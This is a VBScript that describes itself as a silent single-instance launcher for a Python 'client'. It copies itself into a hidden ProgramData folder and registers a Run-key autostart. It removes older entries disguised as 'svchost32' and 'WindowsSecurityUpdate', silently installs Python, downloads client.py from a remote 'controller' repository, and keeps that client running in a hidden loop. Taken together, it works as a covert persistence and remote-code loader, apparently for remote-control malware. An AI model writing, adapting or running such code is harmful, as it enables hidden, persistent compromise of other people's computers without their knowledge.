' ============================================================================
' CLIENT.PY SINGLE-INSTANCE SILENT LAUNCHER - IMPROVED VERSION
' ============================================================================
' This VBS script ensures only one instance of client.py runs at a time
' It launches silently without any visible windows
' ============================================================================

Option Explicit
Dim sh, fso
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Dim arch: arch = LCase(sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%"))
Const EXPECTED_MD5 = "c6718a72d4727d01f3d4727c2690ab5e"
Dim scriptDir: scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
Dim safeDir: safeDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\SystemCache"
If Not fso.FolderExists(safeDir) Then
  fso.CreateFolder(safeDir)
  On Error Resume Next
  fso.GetFolder(safeDir).Attributes = fso.GetFolder(safeDir).Attributes Or 2
  On Error GoTo 0
End If
Dim logDir: logDir = sh.ExpandEnvironmentStrings("%TEMP%") & "\ClientLauncher"
If Not fso.FolderExists(logDir) Then fso.CreateFolder(logDir)
Dim logPath: logPath = logDir & "\launcher.log"
Sub EnsureSafeLauncher()
  On Error Resume Next
  Dim dest
  dest = safeDir & "\ClientService.vbs"
  fso.CopyFile WScript.ScriptFullName, dest, True
  fso.GetFile(dest).Attributes = fso.GetFile(dest).Attributes Or 2
End Sub

Sub EnsureClientInSafe()
  On Error Resume Next
  Dim src, dest
  src = scriptDir & "\client.py"
  dest = safeDir & "\client.py"
  If fso.FileExists(src) Then
    fso.CopyFile src, dest, True
  End If
End Sub
Sub EnsureAutorun()
  On Error Resume Next
  Dim runKey, cmd, dest
  dest = safeDir & "\ClientService.vbs"
  EnsureSafeLauncher
  EnsureClientInSafe
  runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher"
  cmd = "wscript.exe """ & dest & """"
  sh.RegWrite runKey, cmd, "REG_SZ"
End Sub
EnsureAutorun
Sub RemoveLegacyAutorun()
  On Error Resume Next
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost32"
  sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate"
End Sub
RemoveLegacyAutorun
Sub Log(s)
  On Error Resume Next
  Dim lf: Set lf = fso.OpenTextFile(logPath, 8, True)
  lf.WriteLine Now & " " & s
  lf.Close
End Sub
Function ExecOut(cmd)
  Dim p: Set p = sh.Exec(cmd)
  Dim o: o = ""
  Do While Not p.StdOut.AtEndOfStream
    o = o & p.StdOut.ReadLine() & vbCrLf
  Loop
  ExecOut = o
End Function
Function FindPythonw()
  On Error Resume Next
  Dim out, lines, i, p
  out = ExecOut("cmd /c where pythonw.exe")
  lines = Split(out, vbCrLf)
  For i = 0 To UBound(lines)
    p = Trim(lines(i))
    If p <> "" And fso.FileExists(p) Then FindPythonw = p : Exit Function
  Next
  out = ExecOut("cmd /c where python.exe")
  lines = Split(out, vbCrLf)
  For i = 0 To UBound(lines)
    p = Trim(lines(i))
    If p <> "" Then
      p = Replace(p, "python.exe", "pythonw.exe")
      If fso.FileExists(p) Then FindPythonw = p : Exit Function
    End If
  Next
  p = sh.ExpandEnvironmentStrings("%LocalAppData%") & "\Programs\Python\Python312\pythonw.exe"
  If fso.FileExists(p) Then FindPythonw = p : Exit Function
  FindPythonw = ""
End Function
Function FileMD5(path)
  On Error Resume Next
  Dim out: out = ExecOut("cmd /c certutil -hashfile """ & path & """ MD5")
  Dim lines: lines = Split(out, vbCrLf)
  Dim i, h: h = ""
  For i = 0 To UBound(lines)
    If Len(lines(i)) >= 32 And InStr(lines(i), " ") = 0 Then
      h = Trim(lines(i))
      Exit For
    End If
  Next
  FileMD5 = LCase(h)
End Function
Function DownloadToFile(url, path)
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", url, False
  xhr.Send
  If xhr.Status = 200 Then
    Dim stm: Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1
    stm.Open
    stm.Write xhr.responseBody
    stm.SaveToFile path, 2
    stm.Close
    DownloadToFile = True
  Else
    DownloadToFile = False
  End If
End Function
Function IsOnline()
  On Error Resume Next
  Dim xhr: Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", "http://www.msftconnecttest.com/connecttest.txt", False
  xhr.Send
  If xhr.Status = 200 Then IsOnline = True : Exit Function
  Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", "https://www.google.com/generate_204", False
  xhr.Send
  If xhr.Status = 204 Or xhr.Status = 200 Then
    IsOnline = True
  Else
    IsOnline = False
  End If
End Function
Function PythonAvailable()
  On Error Resume Next
  Dim out: out = ExecOut("cmd /c py -3 -V")
  If InStr(out, "Python 3") > 0 Then PythonAvailable = True : Exit Function
  out = ExecOut("cmd /c python.exe -V")
  If InStr(out, "Python 3") > 0 Then PythonAvailable = True Else PythonAvailable = False
End Function
Sub EnsurePython()
  If PythonAvailable() Then Exit Sub
  If PythonAvailable() Then Exit Sub
  If Not IsOnline() Then
    Log "Offline detected; deferring Python install"
    Exit Sub
  End If
  Dim url, installer
  If InStr(arch, "64") > 0 Then
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
  Else
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
  End If
  installer = logDir & "\python312.exe"
  If Not DownloadToFile(url, installer) Then Log "Python download failed: " & url : Exit Sub
  Dim cmd: cmd = """" & installer & """ /quiet PrependPath=1 Include_test=0"
  sh.Run cmd, 0, True
  If Not PythonAvailable() Then Log "Python install failed"
End Sub
Function FindClientPy()
  Dim p1: p1 = scriptDir & "\client.py"
  If fso.FileExists(p1) Then FindClientPy = p1 : Exit Function
  Dim p2: p2 = safeDir & "\client.py"
  If fso.FileExists(p2) Then FindClientPy = p2 : Exit Function
  Dim url: url = "https://raw.githubusercontent.com/Bryllebanquil/controller/main/client.py"
  If Not IsOnline() Then
    Log "Offline detected; deferring client.py download"
    FindClientPy = ""
    Exit Function
  End If
  If DownloadToFile(url, p2) Then
    Dim md5: md5 = FileMD5(p2)
    If md5 = EXPECTED_MD5 Then
      FindClientPy = p2
      Exit Function
    Else
      On Error Resume Next
      fso.DeleteFile p2, True
      On Error GoTo 0
      Log "MD5 mismatch: " & md5
    End If
  Else
    Log "client.py download failed"
  End If
  FindClientPy = ""
End Function
Function IsRunning()
  On Error Resume Next
  Dim svc: Set svc = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
  Dim q: q = "SELECT * FROM Win32_Process WHERE CommandLine LIKE '%client.py%'"
  Dim col: Set col = svc.ExecQuery(q)
  IsRunning = (col.Count > 0)
End Function
Sub LaunchClient(scriptPath)
  Dim wd: wd = fso.GetParentFolderName(scriptPath)
  Dim cmd
  On Error Resume Next
  sh.CurrentDirectory = wd
  Dim pyw: pyw = FindPythonw()
  If pyw <> "" Then
    cmd = """" & pyw & """ """ & scriptPath & """"
  ElseIf PythonAvailable() Then
    cmd = "py -3 """ & scriptPath & """"
  Else
    cmd = "python.exe """ & scriptPath & """"
  End If
  sh.Run cmd, 0, False
End Sub
Sub Main()
  EnsurePython()
  Dim cp: cp = FindClientPy()
  If cp = "" Then Log "client.py unavailable" : Exit Sub
  If Not IsRunning() Then LaunchClient cp : WScript.Sleep 3000
  Do
    If Not IsRunning() Then LaunchClient cp
    WScript.Sleep 10000
  Loop
End Sub
Main
